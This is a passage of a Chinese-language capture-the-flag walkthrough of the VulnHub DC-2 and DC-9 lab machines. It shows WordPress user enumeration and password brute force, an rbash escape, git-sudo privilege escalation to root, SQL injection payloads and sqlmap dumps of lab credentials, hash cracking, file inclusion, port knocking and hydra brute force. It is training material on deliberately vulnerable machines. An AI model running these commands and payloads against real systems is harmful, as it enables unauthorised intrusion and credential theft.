class="line"></span><br><span class="line">**[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)**</span><br><span class="line"></span><br><span class="line">**[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)**</span><br></pre></td></tr></table></figure>
-
-<p>將這些用戶寫成user.txt再丟一次爆破</p>
-<p><code>wpscan --url dc-2 user.txt -P passwd_dict.txt</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://dc-2/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.2</span><br><span class="line"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;===========================================================================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;============================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Xmlrpc against 3 user/s</span><br><span class="line">**[SUCCESS] - jerry / adipiscing                                                                                                                            </span><br><span class="line">[SUCCESS] - tom / parturient**                                                                                                                              </span><br><span class="line">Trying admin / log Time: 00:00:25 &lt;===============================================                                    &gt; (646 / 1121) 57.62%  ETA: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
-
-<p><strong>[SUCCESS] - jerry &#x2F; adipiscing<br>[SUCCESS] - tom &#x2F; parturient</strong>  </p>
-<p>嘗試用這些用戶去找admin密碼</p>
-<p><a target="_blank" rel="noopener" href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
-<p>jerry</p>
-<p><img src="/img/DC_Untitled_35.png" alt="Untitled"></p>
-<p><img src="/img/DC_Untitled_36.png" alt="Untitled"></p>
-<p>找到了flag2</p>
-<p><img src="/img/DC_Untitled_37.png" alt="Untitled"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
-
-<p>再查看了Tom的後台，並沒有發現任何東西</p>
-<p>先前有個7744 port開啟，也許能去看看ssh</p>
-<p><code>ssh [tom@192.168.147.133](mailto:tom@192.168.147.133) -p 7744</code></p>
-<p><img src="/img/DC_Untitled_38.png" alt="Untitled"></p>
-<p>flag3 這裡無法用cat，但vi能開啟檔案</p>
-<p><img src="/img/DC_Untitled_39.png" alt="Untitled"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
-
-<p>還有一種方式能查看flag3</p>
-<p>需要绕过rbash（受限的bash）</p>
-<p>**<code>BASH_CMDS</code>**是 Bash 中的一個關聯數組，用於存儲命令歷史記錄及其相應的命令行</p>
-<p><img src="/img/DC_Untitled_40.png" alt="Untitled"></p>
-<p>另一種繞過rbash方式</p>
-<p><img src="/img/DC_Untitled_41.png" alt="Untitled"></p>
-<p>直接再tom用戶下su jerry登入</p>
-<p><img src="/img/DC_Untitled_42.png" alt="Untitled"></p>
-<p>預設再tom底下，需要切換目錄到jerry</p>
-<p><img src="/img/DC_Untitled_43.png" alt="Untitled"></p>
-<p>sudo -l可以知道當下可以用sudo執行的命令</p>
-<p>看下來應該是跟git提權相關</p>
-<ul>
-<li><p>git提權補充</p>
-<p>  git -p help &#x3D;&#x3D; man git</p>
-<p>  所以兩者串起來用 sudo 叫起來的 git會去執行 man 而 man 支援 !</p>
-<p>  就等於用 sudo 可以執行任意指令</p>
-</li>
-</ul>
-<p><img src="/img/DC_Untitled_44.png" alt="Untitled"></p>
-<p><code>sudo /usr/bin/git help config</code> 輸入後再最後一行打上!&#x2F;bin&#x2F;bash</p>
-<p><img src="/img/DC_Untitled_45.png" alt="Untitled"></p>
-<p>切換到root目錄下完事</p>
-<p><img src="/img/DC_Untitled_46.png" alt="Untitled"></p>
-<hr>
-<hr>
-<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9</a></p>
-<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-9.zip"></a></p>
-<p>已知該機器的MAC 00:0C:29:FE:8B:07</p>
-<p><img src="/img/DC_Untitled_47.png" alt="Untitled"></p>
-<p>因為是橋接，所以機器的網段應該會一樣 </p>
-<p>kali : 192.168.147.128   NAT</p>
-<p>dc-9 : MAC 00:0C:29:FE:8B:07  NAT</p>
-<p>需要用<code>netdiscover</code>去掃192.168.0.0&#x2F;24的位置看有沒有符合該網段資訊的IP</p>
-<p>或是可以用<code>namp -sn 192.168.0.0/24</code></p>
-<p>這裡用 <code>netdiscover -i eth1 -r 192.168.147.0/24</code></p>
-<p><img src="/img/DC_Untitled_48.png" alt="Untitled"></p>
-<p>找到了192.168.147.131的IP位址</p>
-<p><code>nmap -sV -p- -O -T4 192.168.147.131</code></p>
-<ul>
-<li><code>-sV</code> 確定服務&#x2F;版本信息</li>
-<li><code>-T4</code> 為了更快的執行</li>
-<li><code>-p-</code> 掃描所有端口</li>
-<li><code>-O</code> 識別操作系統</li>
-</ul>
-<p><img src="/img/DC_Untitled_49.png" alt="Untitled"></p>
-<p>查看開放的服務後沒發現可利用的內容</p>
-<p>22 port filtered</p>
-<p>一般nmap所掃描出來的結果有三種：<code>open、filtered、unfiltered</code></p>
-<ul>
-<li>Open意思是指目標機器的這個連接埠有開啟</li>
-<li>Filtered意思是指有Firewall&#x2F;filter,或是其它的網路設備將掩蓋了此連接埠，並且阻止nmap去得知連接埠是否有開啟</li>
-<li>Unfiltered意思是指這個連接埠被nmap判定為關閉的，並且沒有任何Firewall&#x2F;filter來阻止nmap來嘗試得知連接埠的狀態。Unfiltered ports是很平常的訊息，並且只出現在大部份的掃描連接埠在filtered狀態中。</li>
-</ul>
-<p>猜他使用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Port_knocking">Port Knocking</a> 的方法</p>
-<p>查看該網站功能</p>
-<p><img src="/img/DC_Untitled_50.png" alt="Untitled"></p>
-<p>再搜索位址下使用SQL injection可以允許執行，不過需要繞一下</p>
-<p><img src="/img/DC_Untitled_51.png" alt="Untitled"></p>
-<p>用sqlmap去爆破，首先複製全Request成一個txt檔案(Copy to file)</p>
-<p><img src="/img/DC_Untitled_52.png" alt="Untitled"></p>
-<p><code>sqlmap -r search.txt --dbs</code></p>
-<p><img src="/img/DC_Untitled_53.png" alt="Untitled"></p>
-<p>有一些存在的DB</p>
-<p>available databases [3]:<br>[<em>]  <em>information_schema</em><br>[</em>]  Staff<br>[*]  users</p>
-<p>再來找<strong>tables</strong></p>
-<p><code>sqlmap -r search.txt --tables</code></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="keyword">Parameter</span>: <span class="keyword">search</span> (POST)</span><br><span class="line">    Type: <span class="type">time</span><span class="operator">-</span>based blind</span><br><span class="line">    Title: MySQL <span class="operator">&gt;=</span> <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="type">time</span><span class="operator">-</span>based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="keyword">search</span><span class="operator">=</span>param<span class="string">&#x27; AND (SELECT 3355 FROM (SELECT(SLEEP(5)))Rcyx) AND &#x27;</span>nyOI<span class="string">&#x27;=&#x27;</span>nyOI</span><br><span class="line"></span><br><span class="line">    Type: <span class="keyword">UNION</span> query</span><br><span class="line">    Title: Generic <span class="keyword">UNION</span> query (<span class="keyword">NULL</span>) <span class="operator">-</span> <span class="number">6</span> columns</span><br><span class="line">    Payload: <span class="keyword">search</span><span class="operator">=</span>param<span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a707871,0x5067686578705049616e6f687a72434e7769564250617772595941474a4d6e614c4a4c72417a4556,0x7176707a71),NULL,NULL,NULL,NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 10 (buster)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.38</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] fetching database names</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] fetching tables for databases: &#x27;</span>Staff, information_schema, users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: information_schema</span></span><br><span class="line"><span class="string">[76 tables]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| ALL_PLUGINS                           |</span></span><br><span class="line"><span class="string">| APPLICABLE_ROLES                      |</span></span><br><span class="line"><span class="string">| CHARACTER_SETS                        |</span></span><br><span class="line"><span class="string">| CHECK_CONSTRAINTS                     |</span></span><br><span class="line"><span class="string">| CLIENT_STATISTICS                     |</span></span><br><span class="line"><span class="string">| COLLATIONS                            |</span></span><br><span class="line"><span class="string">| COLLATION_CHARACTER_SET_APPLICABILITY |</span></span><br><span class="line"><span class="string">| COLUMNS                               |</span></span><br><span class="line"><span class="string">| COLUMN_PRIVILEGES                     |</span></span><br><span class="line"><span class="string">| ENABLED_ROLES                         |</span></span><br><span class="line"><span class="string">| ENGINES                               |</span></span><br><span class="line"><span class="string">| EVENTS                                |</span></span><br><span class="line"><span class="string">| FILES                                 |</span></span><br><span class="line"><span class="string">| GEOMETRY_COLUMNS                      |</span></span><br><span class="line"><span class="string">| GLOBAL_STATUS                         |</span></span><br><span class="line"><span class="string">| GLOBAL_VARIABLES                      |</span></span><br><span class="line"><span class="string">| INDEX_STATISTICS                      |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_PAGE                    |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_PAGE_LRU                |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_POOL_STATS              |</span></span><br><span class="line"><span class="string">| INNODB_CMP                            |</span></span><br><span class="line"><span class="string">| INNODB_CMPMEM                         |</span></span><br><span class="line"><span class="string">| INNODB_CMPMEM_RESET                   |</span></span><br><span class="line"><span class="string">| INNODB_CMP_PER_INDEX                  |</span></span><br><span class="line"><span class="string">| INNODB_CMP_PER_INDEX_RESET            |</span></span><br><span class="line"><span class="string">| INNODB_CMP_RESET                      |</span></span><br><span class="line"><span class="string">| INNODB_FT_BEING_DELETED               |</span></span><br><span class="line"><span class="string">| INNODB_FT_CONFIG                      |</span></span><br><span class="line"><span class="string">| INNODB_FT_DEFAULT_STOPWORD            |</span></span><br><span class="line"><span class="string">| INNODB_FT_DELETED                     |</span></span><br><span class="line"><span class="string">| INNODB_FT_INDEX_CACHE                 |</span></span><br><span class="line"><span class="string">| INNODB_FT_INDEX_TABLE                 |</span></span><br><span class="line"><span class="string">| INNODB_LOCKS                          |</span></span><br><span class="line"><span class="string">| INNODB_LOCK_WAITS                     |</span></span><br><span class="line"><span class="string">| INNODB_METRICS                        |</span></span><br><span class="line"><span class="string">| INNODB_MUTEXES                        |</span></span><br><span class="line"><span class="string">| INNODB_SYS_COLUMNS                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_DATAFILES                  |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FIELDS                     |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FOREIGN                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FOREIGN_COLS               |</span></span><br><span class="line"><span class="string">| INNODB_SYS_INDEXES                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_SEMAPHORE_WAITS            |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLES                     |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLESPACES                |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLESTATS                 |</span></span><br><span class="line"><span class="string">| INNODB_SYS_VIRTUAL                    |</span></span><br><span class="line"><span class="string">| INNODB_TABLESPACES_ENCRYPTION         |</span></span><br><span class="line"><span class="string">| INNODB_TABLESPACES_SCRUBBING          |</span></span><br><span class="line"><span class="string">| INNODB_TRX                            |</span></span><br><span class="line"><span class="string">| KEY_CACHES                            |</span></span><br><span class="line"><span class="string">| KEY_COLUMN_USAGE                      |</span></span><br><span class="line"><span class="string">| PARAMETERS                            |</span></span><br><span class="line"><span class="string">| PARTITIONS                            |</span></span><br><span class="line"><span class="string">| PLUGINS                               |</span></span><br><span class="line"><span class="string">| PROCESSLIST                           |</span></span><br><span class="line"><span class="string">| PROFILING                             |</span></span><br><span class="line"><span class="string">| REFERENTIAL_CONSTRAINTS               |</span></span><br><span class="line"><span class="string">| ROUTINES                              |</span></span><br><span class="line"><span class="string">| SCHEMATA                              |</span></span><br><span class="line"><span class="string">| SCHEMA_PRIVILEGES                     |</span></span><br><span class="line"><span class="string">| SESSION_STATUS                        |</span></span><br><span class="line"><span class="string">| SESSION_VARIABLES                     |</span></span><br><span class="line"><span class="string">| SPATIAL_REF_SYS                       |</span></span><br><span class="line"><span class="string">| STATISTICS                            |</span></span><br><span class="line"><span class="string">| SYSTEM_VARIABLES                      |</span></span><br><span class="line"><span class="string">| TABLES                                |</span></span><br><span class="line"><span class="string">| TABLESPACES                           |</span></span><br><span class="line"><span class="string">| TABLE_CONSTRAINTS                     |</span></span><br><span class="line"><span class="string">| TABLE_PRIVILEGES                      |</span></span><br><span class="line"><span class="string">| TABLE_STATISTICS                      |</span></span><br><span class="line"><span class="string">| TRIGGERS                              |</span></span><br><span class="line"><span class="string">| USER_PRIVILEGES                       |</span></span><br><span class="line"><span class="string">| USER_STATISTICS                       |</span></span><br><span class="line"><span class="string">| VIEWS                                 |</span></span><br><span class="line"><span class="string">| user_variables                        |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">[2 tables]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| StaffDetails                          |</span></span><br><span class="line"><span class="string">| Users                                 |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">[1 table]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| UserDetails                           |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br></pre></td></tr></table></figure>
-
-<p>提取表的每一列(<code>Staff</code>、users)</p>
-<p><code>sqlmap -r search_form.txt --columns -D Staff</code></p>
-<p><img src="/img/DC_Untitled_54.png" alt="Untitled"></p>
-<p><code>sqlmap -r search.txt --columns -D users</code></p>
-<p><img src="/img/DC_Untitled_55.png" alt="Untitled"></p>
-<p>接下來轉儲tables的中的數據</p>
-<p><code>sqlmap -r search.txt --dump -D users -T UserDetails</code></p>
-<p><img src="/img/DC_Untitled_56.png" alt="Untitled"></p>
-<p><code>sqlmap -r search.txt --dump -D Staff -T Users</code></p>
-<p><img src="/img/DC_Untitled_57.png" alt="Untitled"></p>
-<p>這裡就找到了admin Password，它包含一個明文用戶名和一個<a target="_blank" rel="noopener" href="https://auth0.com/blog/hashing-passwords-one-way-road-to-security/">散列密碼</a>，甚至 sqlmap 也將其識別為 MD5。</p>
-<p><a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a>破解這個哈希值</p>
-<p><img src="/img/DC_Untitled_58.png" alt="Untitled"></p>
-<p>transorbital1</p>
-<p><img src="/img/DC_Untitled_59.png" alt="Untitled"></p>
-<p>這看起來是要請求加載file，也許可以利用<strong>FILE INCLUSION VULNERABILITIES測試</strong></p>
-<p><img src="/img/DC_Untitled_60.png" alt="Untitled"></p>
-<p>先前再22 port找到看起來是<strong>Port knocking的問題</strong></p>
-<p>透過knockd.conf去察看文件</p>
-<p><img src="/img/DC_Untitled_61.png" alt="Untitled"></p>
-<p>為了打開 SSH 端口需要使用 SYN 數據包訪問的端口順序 - 7469,8475,9842 端口。</p>
-<p><img src="/img/DC_Untitled_62.png" alt="Untitled"></p>
-<p>我們可以使用以下方法之一：</p>
-<ol>
-<li><p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/knockd">Knockd</a>- 需要安裝。</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/hping3">hping3</a><code>hping3 -S 10.0.0.235 -p 7469 -c 1; hping3 -S 10.0.0.235 -p 8475 -c 1; hping3 -S 10.0.0.235 -p 9842 -c 1</code></p>
-<ul>
-<li>預安裝在 Kali 上。使用以下命令向每個端口發送 1 個 SYN 數據包：</li>
-</ul>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat</a>- 我將使用這種方法，因為它（手動但）簡單。</p>
-</li>
-</ol>
-<p><img src="/img/DC_Untitled_63.png" alt="Untitled"></p>
-<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a><strong>hydra</strong></h3><p>前面在users的db中找到了用戶名稱跟密碼的列表，需要知道哪個帳號匹配哪個密碼，這裡用爆破方式，需要將剛sqlmap的資料丟過來</p>
-<p>首先需要創建user跟passwd的文件</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Table</span>: UserDetails</span><br><span class="line">[<span class="number">17</span> entries]</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> lastname   <span class="operator">|</span> password      <span class="operator">|</span> reg_date            <span class="operator">|</span> username  <span class="operator">|</span> firstname <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> Moe        <span class="operator">|</span> <span class="number">3</span>kfs86sfd     <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> marym     <span class="operator">|</span> Mary      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>  <span class="operator">|</span> Dooley     <span class="operator">|</span> <span class="number">468</span>sfdfsd2    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> julied    <span class="operator">|</span> Julie     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>  <span class="operator">|</span> Flintstone <span class="operator">|</span> <span class="number">4</span>sfd87sfd1    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> fredf     <span class="operator">|</span> Fred      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>  <span class="operator">|</span> Rubble     <span class="operator">|</span> RocksOff      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> barneyr   <span class="operator">|</span> Barney    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span>  <span class="operator">|</span> Cat        <span class="operator">|</span> TC<span class="operator">&amp;</span>TheBoyz    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> tomc      <span class="operator">|</span> Tom       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6</span>  <span class="operator">|</span> Mouse      <span class="operator">|</span> B8m#<span class="number">48</span>sd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> jerrym    <span class="operator">|</span> Jerry     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">7</span>  <span class="operator">|</span> Flintstone <span class="operator">|</span> Pebbles       <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> wilmaf    <span class="operator">|</span> Wilma     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8</span>  <span class="operator">|</span> Rubble     <span class="operator">|</span> BamBam01      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> bettyr    <span class="operator">|</span> Betty     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">9</span>  <span class="operator">|</span> Bing       <span class="operator">|</span> UrAG0D<span class="operator">!</span>       <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> chandlerb <span class="operator">|</span> Chandler  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span> Tribbiani  <span class="operator">|</span> Passw0rd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> joeyt     <span class="operator">|</span> Joey      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span> Green      <span class="operator">|</span> yN72#dsd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> rachelg   <span class="operator">|</span> Rachel    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> Geller     <span class="operator">|</span> ILoveRachel   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> rossg     <span class="operator">|</span> Ross      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">13</span> <span class="operator">|</span> Geller     <span class="operator">|</span> <span class="number">3248</span>dsds7s    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> monicag   <span class="operator">|</span> Monica    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span> Buffay     <span class="operator">|</span> smellycats    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> phoebeb   <span class="operator">|</span> Phoebe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15</span> <span class="operator">|</span> McScoots   <span class="operator">|</span> YR3BVxxxw87   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> scoots    <span class="operator">|</span> Scooter   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">16</span> <span class="operator">|</span> Trump      <span class="operator">|</span> Ilovepeepee   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> janitor   <span class="operator">|</span> Donald    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">17</span> <span class="operator">|</span> Morrison   <span class="operator">|</span> Hawaii<span class="operator">-</span>Five<span class="number">-0</span> <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">28</span> <span class="operator">|</span> janitor2  <span class="operator">|</span> Scott     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br></pre></td></tr></table></figure>
-
